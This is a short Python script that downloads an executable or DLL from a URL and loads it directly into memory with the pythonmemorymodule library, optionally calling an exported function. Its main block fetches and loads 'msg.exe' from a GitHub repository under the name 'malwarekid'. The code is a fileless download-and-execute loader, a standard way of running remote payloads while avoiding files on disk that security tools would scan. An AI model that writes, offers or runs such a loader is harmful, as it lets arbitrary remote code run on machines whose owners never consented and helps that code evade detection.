
import urllib.request
import pythonmemorymodule

def load_dll_or_exe_from_url(url, file_type, method=None):
    request = urllib.request.Request(url)
    result = urllib.request.urlopen(request)
    buf = result.read()

    if file_type == 'dll':
        dll = pythonmemorymodule.MemoryModule(data=buf, debug=True)
        if method:
            startDll = dll.get_proc_addr(method)
            assert startDll(), f"Failed to execute '{method}' procedure"
    elif file_type == 'exe':
        exe = pythonmemorymodule.MemoryModule(data=buf, debug=True)
    else:
        print(f"Unknown file type: {file_type}")
        return

if __name__ == "__main__":
    load_dll_or_exe_from_url("https://github.com/malwarekid/GoodUSB/raw/master/msg.exe", "exe", "None")
